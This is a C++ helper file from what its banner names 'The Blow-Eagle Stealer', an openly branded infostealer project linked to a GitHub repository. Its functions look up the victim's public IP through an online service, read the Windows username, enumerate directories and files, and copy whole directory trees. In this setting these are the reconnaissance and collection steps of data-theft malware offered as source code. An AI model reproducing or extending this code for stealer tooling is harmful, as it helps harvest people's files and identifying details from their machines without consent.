/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "helper.h"

size_t func::WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
	size_t totalSize = size * nmemb;
	output->append(contents, totalSize);
	return totalSize;
}

std::string func::GetIP()
{
	std::string ipAddress = "";

	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, func::WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			return "Failed to retrieve IP address: " + std::string(curl_easy_strerror(res));
		}

		curl_easy_cleanup(curl);
	}
	return ipAddress;
}

std::string func::GetUser()
{
	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());
	return userName;
}


void func::GetDirectories(const std::string& directoryPath, std::string*& arr, int& arrSize)
{
	std::vector<std::string> directories;

	std::string searchPath = directoryPath + "\\*";

	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				std::string directoryName = findData.cFileName;

				// Exclude current directory (.) and parent directory (..)
				if (directoryName != "." && directoryName != "..")
				{
					std::string* arr2 = new std::string[arrSize + 1];
					for (size_t i = 0; i < arrSize; i++)
					{
						arr2[i] = arr[i];
					}
					arr2[arrSize] = directoryName;
					arrSize++;
					arr = new std::string[arrSize];
					for (size_t i = 0; i < arrSize; i++)
					{
						arr[i] = arr2[i];
					}
					delete[] arr2;
				}
			}
		} while (FindNextFileA(hFind, &findData));

		FindClose(hFind);
	}

}

void func::copyDirectory(const std::filesystem::path& sourceDir, const std::filesystem::path& destinationDir) {
	try
	{
		// Create the destination directory if it doesn't exist
		std::filesystem::create_directory(destinationDir);

		// Iterate over the files and directories in the source directory
		for (const auto& entry : std::filesystem::directory_iterator(sourceDir)) {
			const auto& path = entry.path();

			// Construct the corresponding path in the destination directory
			const auto& destinationPath = destinationDir / path.filename();

			// Check if the current entry is a directory
			if (std::filesystem::is_directory(path)) {
				// Recursively copy the directory
				copyDirectory(path, destinationPath);
			}
			else {
				// Copy the file
				std::filesystem::copy_file(path, destinationPath);
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy directory: " << ex.what() << std::endl;
	}
}

void func::copyFile(const std::string& sourcePath, const std::string& destinationPath) {
	try {
		// Copy the file
		std::filesystem::copy(sourcePath, destinationPath, std::filesystem::copy_options::overwrite_existing);
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy file: " << ex.what() << std::endl;
	}
}

void func::GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrSize)
{

	try {
		for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
			if (std::filesystem::is_regular_file(entry)) {
				std::string* arr2 = new std::string[arrSize + 1];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr2[i] = arr[i];
				}
				arr2[arrSize] = entry.path().filename().string();
				arrSize++;
				arr = new std::string[arrSize];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr[i] = arr2[i];
				}
				delete[] arr2;
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Error accessing directory: " << ex.what() << std::endl;
	}
}